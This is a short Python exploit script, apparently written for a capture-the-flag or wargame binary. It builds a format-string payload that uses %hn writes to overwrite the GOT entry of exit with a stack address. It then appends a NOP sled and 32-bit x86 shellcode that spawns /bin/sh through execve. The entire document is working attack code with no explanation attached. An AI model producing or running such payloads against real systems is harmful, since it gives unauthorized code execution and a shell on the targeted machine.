from struct import pack

shellcode = 0xffffd6fc
exit_got = 0x080497e0

payload = pack("I", exit_got)+pack("I", exit_got+0x2)
payload += bytes("%{}x%10$hn".format((shellcode & 0xffff) - len(payload)))
payload += bytes("%{}x%11$hn".format((shellcode >> 0x10) - (shellcode & 0xffff)))
payload += b"\x90"*16 + b"\x31\xd2\x31\xc0\x89\x14\x24\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\xff\x89\x14\x24\x6a\xff\x89\x1c\x24\x89\xe1\xb0\x0b\xcd\x80"

print(payload)
